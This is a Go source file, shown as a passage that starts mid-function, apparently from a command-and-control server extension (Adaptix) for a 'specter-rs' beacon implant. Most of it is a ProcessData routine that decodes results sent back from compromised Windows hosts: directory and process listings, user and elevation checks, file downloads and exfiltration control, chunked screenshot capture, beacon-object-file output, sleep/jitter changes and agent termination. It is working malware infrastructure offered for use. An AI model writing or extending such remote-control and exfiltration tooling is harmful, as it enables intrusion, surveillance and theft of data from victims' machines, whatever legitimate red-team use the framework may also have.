			messageData.Message = "Task: terminate agent thread"
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
			messageData.Message = "Task: terminate agent process"
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	default:
		err = fmt.Errorf("Command '%v' not found", command)
		goto RET
	}

	taskData.Data, err = PackArray(array)

RET:
	return taskData, messageData, err
}

// ProcessData: beacon results — the listener frame (flags 0, u32 LE
// origLen — uncompressed pass-through of decompressZlibData), then the
// u32 BE size and the per-task records the beacon emits.
func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	// Listener frame: flags:1 + origLen:4 (LE). Uncompressed passthrough
	// when the flag is clear — the beacon never compresses (MVP).
	if len(decryptedData) < 5 {
		return errors.New("failed to unmarshal message")
	}
	flags := decryptedData[0]
	origLen := int(decryptedData[1]) | int(decryptedData[2])<<8 | int(decryptedData[3])<<16 | int(decryptedData[4])<<24
	data := decryptedData[5:]
	if flags != 0 {
		return errors.New("specter-rs MVP sends uncompressed frames only")
	}
	if len(data) != origLen {
		return errors.New("failed to unmarshal message")
	}

	packer := CreatePacker(data)

	if false == packer.CheckPacker([]string{"int"}) {
		return errors.New("failed to unmarshal message")
	}

	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		return errors.New("failed to unmarshal message")
	}

	// BOF output dedup (native ProcessData): the first EXEC_BOF_OUT record
	// of a task carries the "BOF output" label, the following ones are
	// rendered bare so the console shows one output block per BOF.
	bofOutput := make(map[string]bool)

	for packer.Size() >= 8 {

		if false == packer.CheckPacker([]string{"int", "int"}) {
			break
		}

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case COMMAND_ERROR:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
			task.MessageType = adaptix.MESSAGE_ERROR

		case COMMAND_PWD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_CD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_CAT:
			if false == packer.CheckPacker([]string{"array", "array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)

		case COMMAND_LS:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()

			var items []adaptix.ListingFileDataWin
			var rootPath string

			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				if false == packer.CheckPacker([]string{"array", "int"}) {
					goto HANDLER
				}
				rootPath = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")

				filesCount := int(packer.ParseInt32())

				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {
					var folders []adaptix.ListingFileDataWin
					var files []adaptix.ListingFileDataWin

					for i := 0; i < filesCount; i++ {
						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
							goto HANDLER
						}
						isDir := packer.ParseInt8()
						fileData := adaptix.ListingFileDataWin{
							IsDir:    false,
							Size:     int64(packer.ParseInt64()),
							Date:     int64(packer.ParseInt32()),
							Filename: Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}

					items = append(folders, files...)

					OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

					for _, item := range items {
						t := time.Unix(item.Date, 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

						if item.IsDir {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", sizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("Listing '%s'", rootPath)
					task.ClearText = OutputText
				}
			}
			Ts.TsClientGuiFilesWindows(task, rootPath, items)

		case COMMAND_GETUID:
			if false == packer.CheckPacker([]string{"byte", "array", "array"}) {
				goto HANDLER
			}
			high := packer.ParseInt8()
			domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			message := ""
			if username != "" {
				if domain != "" {
					username = domain + "\\" + username
				}
				message = fmt.Sprintf("You are '%v'", username)
				if high > 0 {
					message += " (elevated)"
				}
			}
			task.Message = message

		case COMMAND_DISKS:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			var drives []adaptix.ListingDrivesDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				drivesCount := int(packer.ParseInt32())

				for i := 0; i < drivesCount; i++ {
					if false == packer.CheckPacker([]string{"byte", "int"}) {
						goto HANDLER
					}
					var driveData adaptix.ListingDrivesDataWin
					driveCode := packer.ParseInt8()
					driveType := packer.ParseInt32()

					driveData.Name = fmt.Sprintf("%c:", driveCode)
					if driveType == 2 {
						driveData.Type = "USB"
					} else if driveType == 3 {
						driveData.Type = "Hard Drive"
					} else if driveType == 4 {
						driveData.Type = "Network Drive"
					} else if driveType == 5 {
						driveData.Type = "CD-ROM"
					} else {
						driveData.Type = "Unknown"
					}

					drives = append(drives, driveData)
				}

				OutputText := fmt.Sprintf(" %-5s  %s\n", "Drive", "Type")
				OutputText += fmt.Sprintf(" %-5s  %s", "-----", "-----")
				for _, item := range drives {
					OutputText += fmt.Sprintf("\n %-5s  %s", item.Name, item.Type)
				}
				task.Message = "List of mounted drives:"
				task.ClearText = OutputText
			}
			Ts.TsClientGuiDisksWindows(task, drives)

		case COMMAND_PS_LIST:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()

			var proclist []adaptix.ListingProcessDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				processCount := int(packer.ParseInt32())

				if processCount == 0 {
					task.Message = "Failed to get process list"
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				contextMaxSize := 10

				for i := 0; i < processCount; i++ {
					if false == packer.CheckPacker([]string{"word", "word", "word", "byte", "byte", "array", "array", "array"}) {
						goto HANDLER
					}
					procData := adaptix.ListingProcessDataWin{
						Pid:       uint(packer.ParseInt16()),
						Ppid:      uint(packer.ParseInt16()),
						SessionId: uint(packer.ParseInt16()),
						Arch:      "",
					}

					isArch64 := packer.ParseInt8()
					if isArch64 == 0 {
						procData.Arch = "x32"
					} else if isArch64 == 1 {
						procData.Arch = "x64"
					}

					elevated := packer.ParseInt8()
					domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

					if username != "" {
						procData.Context = username
						if domain != "" {
							procData.Context = domain + "\\" + username
						}
						if elevated > 0 {
							procData.Context += " *"
						}

						if len(procData.Context) > contextMaxSize {
							contextMaxSize = len(procData.Context)
						}
					}

					procData.ProcessName = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					proclist = append(proclist, procData)
				}

				type TreeProc struct {
					Data     adaptix.ListingProcessDataWin
					Children []*TreeProc
				}

				procMap := make(map[uint]*TreeProc)
				var roots []*TreeProc

				for _, proc := range proclist {
					node := &TreeProc{Data: proc}
					procMap[proc.Pid] = node
				}

				for _, node := range procMap {
					if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
						roots = append(roots, node)
					} else if parent, ok := procMap[node.Data.Ppid]; ok {
						parent.Children = append(parent.Children, node)
					} else {
						roots = append(roots, node) // orphaned node
					}
				}

				sort.Slice(roots, func(i, j int) bool {
					return roots[i].Data.Pid < roots[j].Data.Pid
				})

				var sortChildren func(node *TreeProc)
				sortChildren = func(node *TreeProc) {
					sort.Slice(node.Children, func(i, j int) bool {
						return node.Children[i].Data.Pid < node.Children[j].Data.Pid
					})
					for _, child := range node.Children {
						sortChildren(child)
					}
				}
				for _, root := range roots {
					sortChildren(root)
				}

				format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
				OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
				OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

				var lines []string

				var formatTree func(node *TreeProc, prefix string, isLast bool)
				formatTree = func(node *TreeProc, prefix string, isLast bool) {
					branch := "\u251C\u2500 "
					if isLast {
						branch = "\u2514\u2500 "
					}
					treePrefix := prefix + branch
					data := node.Data

					line := fmt.Sprintf(format, data.Pid, data.Ppid, data.SessionId, data.Arch, data.Context, treePrefix+data.ProcessName)
					lines = append(lines, line)

					childPrefix := prefix
					if isLast {
						childPrefix += "    "
					} else {
						childPrefix += "\u2502   "
					}

					for i, child := range node.Children {
						formatTree(child, childPrefix, i == len(node.Children)-1)
					}
				}

				for i, root := range roots {
					formatTree(root, "", i == len(roots)-1)
				}

				OutputText += "\n" + strings.Join(lines, "\n")
				task.Message = "Process list:"
				task.ClearText = OutputText
			}
			Ts.TsClientGuiProcessWindows(task, proclist)

		case COMMAND_PS_KILL:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			task.Message = fmt.Sprintf("Process %d killed", pid)

		case COMMAND_PS_RUN:
			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}

			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)

		case COMMAND_JOB:
			if false == packer.CheckPacker([]string{"byte", "byte"}) {
				goto HANDLER
			}
			jobType := packer.ParseInt8()
			state := packer.ParseInt8()

			if jobType == JOB_TYPE_PROCESS {
				if state == JOB_STATE_RUNNING {
					if false == packer.CheckPacker([]string{"array"}) {
						goto HANDLER
					}
					task.Completed = false
					jobOutput := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
					task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
					task.ClearText = jobOutput
				} else if state == JOB_STATE_KILLED {
					task.Completed = true
					task.MessageType = adaptix.MESSAGE_INFO
					task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
				} else if state == JOB_STATE_FINISHED {
					task.Completed = true
					task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
				}
			}

		case COMMAND_JOB_LIST:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			count := packer.ParseInt32()

			var Output string
			if count > 0 {
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s\n", "JobID", "PID", "Type")
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s", "--------", "-----", "-------")
				for i := 0; i < int(count); i++ {
					if false == packer.CheckPacker([]string{"int", "word", "word"}) {
						goto HANDLER
					}
					jobId := fmt.Sprintf("%08x", packer.ParseInt32())
					jobType := packer.ParseInt16()
					pid := packer.ParseInt16()

					stringType := "Unknown"
					if jobType == JOB_TYPE_PROCESS {
						stringType = "Process"
					}
					Output += fmt.Sprintf("\n %-10v  %-5v  %-13s", jobId, pid, stringType)
				}
				task.Message = "Job list:"
				task.ClearText = Output
			} else {
				task.Message = "No active jobs"
			}

		case COMMAND_JOBS_KILL:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			jobId := packer.ParseInt32()

			if result == 0 {
				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = fmt.Sprintf("Job %08x not found", jobId)
			} else {
				task.Message = fmt.Sprintf("Job %08x mark as Killed", jobId)
			}

		case COMMAND_DOWNLOAD:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				if false == packer.CheckPacker([]string{"long", "array"}) {
					goto HANDLER
				}
				fileSize := packer.ParseInt64()
				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
				task.Completed = false
				_ = Ts.TsDownloadAdd(agentData.Id, fileId, fileName, int64(fileSize))

			} else if downloadCommand == DOWNLOAD_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				fileContent := packer.ParseBytes()
				task.Completed = false
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, fileContent)
				continue

			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_FINISHED)
			}

		case COMMAND_SCREENSHOT:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			shotState := packer.ParseInt8()
			if shotState == SCREENSHOT_START {
				if false == packer.CheckPacker([]string{"long"}) {
					goto HANDLER
				}
				shotSize := packer.ParseInt64()
				task.Message = fmt.Sprintf("Screenshot capture started (%v bytes)", shotSize)
				task.Completed = false

				screenshotMutex.Lock()
				screenshotRecon[TaskId] = bytes.NewBuffer(make([]byte, 0, shotSize))
				screenshotMutex.Unlock()

			} else if shotState == SCREENSHOT_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				chunk := packer.ParseBytes()

				screenshotMutex.Lock()
				if buf, ok := screenshotRecon[TaskId]; ok {
					buf.Write(chunk)
				}
				screenshotMutex.Unlock()
				continue

			} else if shotState == SCREENSHOT_FINISH {
				screenshotMutex.Lock()
				buf := screenshotRecon[TaskId]
				delete(screenshotRecon, TaskId)
				screenshotMutex.Unlock()

				task.Message = "Screenshot captured"
				if buf != nil && Ts != nil {
					_ = Ts.TsScreenshotAdd(agentData.Id, "", buf.Bytes())
				}
			}

		case COMMAND_EXFIL:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()

			if downloadState == adaptix.DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_STOPPED, []byte(""))

			} else if downloadState == adaptix.DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, []byte(""))

			} else if downloadState == adaptix.DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_CANCELED)
			}

		case COMMAND_EXEC_BOF:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			state := packer.ParseInt8()
			if state == BOF_STATE_STARTED {
				task.Message = "Async BOF started"
				task.Completed = false
			} else {
				task.Message = "BOF finished"
				task.Completed = true
			}

		case COMMAND_EXEC_BOF_OUT:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			outputType := packer.ParseInt32()

			if outputType == BOF_ERROR_PARSE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Parse BOF error"

			} else if outputType == BOF_ERROR_MAX_FUNCS {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "The number of functions in the BOF file exceeds 512"

			} else if outputType == BOF_ERROR_ENTRY {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Entry function not found"

			} else if outputType == BOF_ERROR_ALLOC {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Error allocation of BOF memory"

			} else if outputType == BOF_ERROR_SYMBOL {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Symbol not found: " + output + "\n"

			} else if outputType == CALLBACK_ERROR {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF output"
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP)

			} else if outputType == CALLBACK_OUTPUT_OEM {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				if _, ok := bofOutput[task.TaskId]; ok {
					task.Message = ""
				} else {
					bofOutput[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.OemCP)

			} else if outputType == CALLBACK_OUTPUT_UTF8 {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				if _, ok := bofOutput[task.TaskId]; ok {
					task.Message = ""
				} else {
					bofOutput[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = output

			} else {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				if _, ok := bofOutput[task.TaskId]; ok {
					task.Message = ""
				} else {
					bofOutput[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP) + "\n"
			}

			task.Completed = false

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			Ts.TsClientGuiFilesStatus(task)

		case COMMAND_MKDIR:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)

		case COMMAND_RM:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}

		case COMMAND_COPY:
			task.Message = "File copied successfully"

		case COMMAND_MV:
			task.Message = "File moved successfully"

		case COMMAND_PROFILE:
			if false == packer.CheckPacker([]string{"int", "int", "int"}) {
				goto HANDLER
			}
			subcommand := packer.ParseInt32()
			if subcommand != 1 {
				goto HANDLER
			}
			agentData.Sleep = packer.ParseInt32()
			agentData.Jitter = packer.ParseInt32()
			task.Message = "Sleep time has been changed"
			_ = Ts.TsAgentUpdateData(agentData)

		case COMMAND_TERMINATE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			exitMethod := packer.ParseInt32()
			if exitMethod == 1 {
				task.Message = "The agent has completed its work (kill thread)"
			} else if exitMethod == 2 {
				task.Message = "The agent has completed its work (kill process)"
			}
			_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

HANDLER:

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}

func (e *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{}
}

func (e *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{}
}
